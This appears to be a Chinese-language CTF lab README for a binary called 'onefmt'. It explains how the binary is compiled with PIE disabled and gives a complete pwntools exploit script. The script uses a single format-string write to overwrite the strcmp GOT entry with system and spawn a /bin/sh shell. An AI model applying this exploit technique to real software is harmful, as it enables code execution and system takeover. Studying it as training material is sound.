# onefmt

格式化字符串利用

仅有一次格式化字符串的机会，需要完成

1. 选择合适函数
1. 改写GOT表
2. 部署getshell字符串（/bin/sh）

## 编译方法

```
gcc onefmt.c -m32 -fstack-protector -z noexecstack -fpie -no-pie -O0 -s -o onefmt
```

说明：

+ `-m32`编译为x86可执行文件。如果在x86环境下编译，无需该参数
+ `-fstack-protector`开启基本的canary防护
+ `-z noexecstack`开启NX
+ `-fpie -no-pie`关闭内存随机化
+ `-O0`关闭代码优化
+ `-s`删除调试符号

## exp

```python
#!/usr/bin/python
# -*- coding: utf8 -*-

from __future__ import print_function
from pwn import *

context.log_level='debug'

elf = ELF('./onefmt')
io = process('./onefmt')

print(hex(elf.got['strcmp']))
print(hex(elf.sym['system']))

p1 = '/bin/sh;'
p2 = '%' + str(0x84 - len(p1)) + 'c%18$hhn'
p2 += '%' + str(0xa0 - 0x84) + 'c%19$hhn'
p2 += '%' + str(0x804 - 0xa0) + 'c%20$hn'
payload = p1 + p2
payload = payload.ljust(56, 'a')
payload += p32(elf.got['strcmp'] + 1)
payload += p32(elf.got['strcmp'])
payload += p32(elf.got['strcmp'] + 2)


io.readuntil(': ')
io.sendline(payload)
io.interactive()

```